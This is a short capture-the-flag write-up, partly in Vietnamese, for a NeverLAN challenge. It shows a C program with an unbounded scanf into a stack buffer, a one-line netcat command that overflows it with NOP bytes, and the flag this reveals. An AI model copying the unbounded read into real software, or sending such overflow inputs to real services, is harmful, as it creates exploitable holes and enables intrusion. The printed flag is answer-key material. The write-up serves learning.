## ThisIsTheEnd

> You'll need a terminal for this one
> 
> \#netcat <br>
> nc neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com 1235
> 
> [viking@x1 thisistheend]$ cat src/HelloWorld.c
> ```c
> #include <stdio.h>
> #include <string.h>
>
> #define BUFFER 4096
> #define FLAG "flag goes here"
> 
> int main() {
>    char flag[sizeof(FLAG)];
>    char buffer[BUFFER];
>    printf("What is your name? ");
>    fflush(stdout);
>    scanf("%s", buffer);
>    strcpy(flag, FLAG);
>    printf("Hello, %s\n", buffer);
>    return 0;
>}
> ```

#### WriteUp

Nhìn sơ thì cũng biết đây là lỗi `Stack buffer overflow`. Mình thử nhập đoạn `NOP` bằng với `BUFFER` xem.

```
traioi$ python -c 'print "\x90"*4096' | nc neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com 1235
What is your name? Hello, flag{this_is_the_end_my_only_friend_\0}
```

Ơ đù, flag kìa `this_is_the_end_my_only_friend_\0`